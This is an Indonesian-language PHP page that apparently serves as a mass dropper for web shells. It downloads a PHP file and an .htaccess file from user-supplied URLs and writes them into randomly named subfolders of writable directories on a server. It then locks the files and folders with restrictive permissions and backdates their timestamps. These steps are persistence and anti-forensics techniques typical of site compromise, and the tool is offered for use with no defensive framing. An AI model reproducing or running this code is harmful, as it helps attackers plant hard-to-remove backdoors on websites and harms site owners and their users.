<body>
    <h2>üöÄ Mass Deploy .php + .htaccess ke Leaf Folder</h2>
    
    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
    <form method="POST" onsubmit="document.getElementById('submitBtn').disabled = true; document.getElementById('submitBtn').innerText = 'üöÄ Memproses...';">
        <label for="target_path">üìÅ Target Path:</label>
        <input type="text" id="target_path" name="target_path" required placeholder="/home/user/public_html">

        <label for="htaccess_url">üåê URL .htaccess:</label>
        <input type="text" id="htaccess_url" name="htaccess_url" required placeholder="https://raw.githubusercontent.com/.../.htaccess">

        <label for="php_url">üåê URL File Target:</label>
        <input type="text" id="php_url" name="php_url" required placeholder="https://raw.githubusercontent.com/.../file.php">

        <label for="php_name">üìÑ Nama File Hasil:</label>
        <input type="text" id="php_name" name="php_name" placeholder="Otomatis terisi dari URL di atas">

        <label for="folder_limit">üî¢ Jumlah Folder Random (1-50):</label>
        <input type="number" id="folder_limit" name="folder_limit" min="1" max="50" value="5">

        <label for="timestamp">‚è±Ô∏è Timestamp (YYYY-MM-DD HH:MM:SS) (Opsional):</label>
        <input type="text" id="timestamp" name="timestamp" placeholder="Contoh: 2025-09-22 04:30:00">

        <button type="submit" id="submitBtn">üöÄ Deploy Sekarang</button>
    </form>
    <?php endif; ?>

    <div class="log">
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        echo "<h3>Memulai Proses Deployment...</h3>";

        // Ambil dan validasi input (Kompatibel dengan PHP versi lama)
        $target = rtrim(isset($_POST['target_path']) ? $_POST['target_path'] : '', '/');
        $phpUrl = isset($_POST['php_url']) ? $_POST['php_url'] : '';
        $htaccessUrl = isset($_POST['htaccess_url']) ? $_POST['htaccess_url'] : '';
        $phpNameInput = isset($_POST['php_name']) ? $_POST['php_name'] : '';
        $phpName = !empty($phpNameInput) ? basename($phpNameInput) : basename($phpUrl); // Ambil dari input, fallback ke URL
        $limit = max(1, min(50, intval(isset($_POST['folder_limit']) ? $_POST['folder_limit'] : 5)));
        $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;

        // Validasi awal
        if (!is_dir($target)) {
            echo "<div class='error'>‚ùå Folder target tidak valid: " . htmlspecialchars($target) . "</div>";
        } elseif (empty($phpName)) {
            echo "<div class='error'>‚ùå Nama file hasil tidak boleh kosong. Pastikan URL File Target valid.</div>";
        } else {
            // Ambil konten file
            $phpContent = fetchFileFromUrl($phpUrl);
            $htaccessContent = fetchFileFromUrl($htaccessUrl);

            if (!$phpContent) echo "<div class='error'>‚ùå Gagal mengambil konten file dari URL: " . htmlspecialchars($phpUrl) . "</div>";
            if (!$htaccessContent) echo "<div class='error'>‚ùå Gagal mengambil konten .htaccess dari URL: " . htmlspecialchars($htaccessUrl) . "</div>";

            // Lanjutkan jika semua konten berhasil diambil
            if ($phpContent && $htaccessContent) {
                echo "<div class='info'>üîé Mencari folder yang bisa ditulisi...</div>";
                $allFolders = findAllWritableFolders($target);
                
                if (empty($allFolders)) {
                    echo "<div class='error'>‚ùå Tidak ditemukan folder yang bisa digunakan untuk deployment.</div>";
                } else {
                    echo "<div class='success'>üì¶ Ditemukan " . count($allFolders) . " folder. Memilih " . $limit . " folder secara acak...</div>";
                    shuffle($allFolders);
                    $targets = array_slice($allFolders, 0, $limit);
                    $usedFolders = [];

                    foreach ($targets as $base) {
                        $newFolder = generateRandomFolderName($base, $usedFolders);
                        $usedFolders[] = $newFolder;

                        echo "<div class='info'>üìÇ Memproses target: " . htmlspecialchars($newFolder) . "</div>";

                        if (!is_dir($newFolder) && !@mkdir($newFolder, 0755, true)) {
                            echo "<div class='error'>‚ùå Gagal membuat folder: " . htmlspecialchars($newFolder) . "</div>";
                            continue;
                        }

                        $phpPath = $newFolder . '/' . $phpName;
                        $htPath  = $newFolder . '/.htaccess';

                        // Tulis dan amankan file
                        if (@file_put_contents($phpPath, $phpContent) !== false) {
                            @chmod($phpPath, 0444);
                            if ($timestamp) @touch($phpPath, $timestamp);
                            echo "<div class='success'>‚úÖ File dideploy & dikunci (0444): " . htmlspecialchars($phpPath) . "</div>";
                        } else {
                            echo "<div class='error'>‚ùå Gagal menulis file ke: " . htmlspecialchars($phpPath) . "</div>";
                        }

                        // Tulis dan amankan .htaccess
                        if (@file_put_contents($htPath, $htaccessContent) !== false) {
                            @chmod($htPath, 0444);
                            if ($timestamp) @touch($htPath, $timestamp);
                            echo "<div class='success'>‚úÖ .htaccess dideploy & dikunci (0444): " . htmlspecialchars($htPath) . "</div>";
                        } else {
                            echo "<div class='error'>‚ùå Gagal menulis .htaccess ke: " . htmlspecialchars($htPath) . "</div>";
                        }

                        // Kunci folder
                        if (@chmod($newFolder, 0555)) {
                             if ($timestamp) @touch($newFolder, $timestamp);
                             echo "<div class='success'>üîí Folder diamankan (0555): " . htmlspecialchars($newFolder) . "</div>";
                        } else {
                             echo "<div class='error'>‚ö†Ô∏è Gagal mengamankan folder " . htmlspecialchars($newFolder) . "</div>";
                        }
                    }
                    echo "<h3 style='color:#0f0;'>‚úÖ Semua Proses Selesai.</h3>";
                }
            }
        }
    }
    ?>
    </div>
    <p style="color:gray;font-size:0.9em; text-align: center; margin-top: 20px;">Versi: <?= SCRIPT_VERSION ?></p>
    
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const urlInput = document.getElementById('php_url');
            const nameInput = document.getElementById('php_name');

            if (urlInput && nameInput) {
                urlInput.addEventListener('input', function() {
                    const urlValue = this.value;
                    let filename = '';
                    
                    try {
                        // Coba parsing dengan URL constructor jika URL valid
                        const url = new URL(urlValue);
                        const pathSegments = url.pathname.split('/').filter(segment => segment);
                        filename = pathSegments.pop() || '';
                    } catch (e) {
                        // Fallback untuk URL yang belum lengkap atau tidak valid saat diketik
                        const parts = urlValue.split('/');
                        const lastPart = parts[parts.length - 1] || '';
                        filename = lastPart.split('?')[0]; // Hapus query string
                    }
                    
                    if (filename) {
                        nameInput.value = filename;
                    }
                });
            }
        });
    </script>
